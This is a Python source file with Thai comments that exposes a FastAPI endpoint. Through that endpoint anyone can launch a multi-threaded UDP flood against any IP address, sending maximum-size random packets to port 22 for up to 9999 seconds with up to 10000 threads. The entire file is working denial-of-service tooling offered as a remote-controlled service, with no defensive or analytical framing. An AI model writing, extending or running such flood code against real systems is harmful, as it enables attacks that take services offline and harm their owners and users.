import socket
import random
import threading
from datetime import datetime, timedelta
from fastapi import FastAPI, HTTPException
import uvicorn

app = FastAPI()

# UDP Flood
def udp_flood(target_ip, duration):
    end_time = datetime.now() + timedelta(seconds=duration)

    def attack():
        payload = random._urandom(65507)  # Maximum UDP packet size
        while datetime.now() < end_time:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(payload, (target_ip, 22))  # Use target IP and port 22
            except Exception:
                pass
            finally:
                s.close()

    return attack

# การโจมตีแบบ UDP Flood
def start_udp_flood(target_ip, duration, threads):
    print(f"Starting UDP Flood attack on {target_ip} for {duration} seconds with {threads} threads.")
    
    udp_attack = udp_flood(target_ip, duration)

    # เริ่มกระบวนการโจมตีด้วยเธรดจำนวนมาก
    for _ in range(threads):
        threading.Thread(target=udp_attack).start()

@app.get("/")
def attack(ip: str, time: int, threads: int = 5000):
    if time > 9999:
        raise HTTPException(status_code=400, detail="Duration cannot exceed 9999 seconds")
    if threads > 10000:
        raise HTTPException(status_code=400, detail="Threads cannot exceed 10000")

    threading.Thread(target=start_udp_flood, args=(ip, time, threads)).start()

    return {
        "status": "success",
        "message": f"UDP Flood attack started on {ip}:22 for {time} seconds with {threads} threads"
    }

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
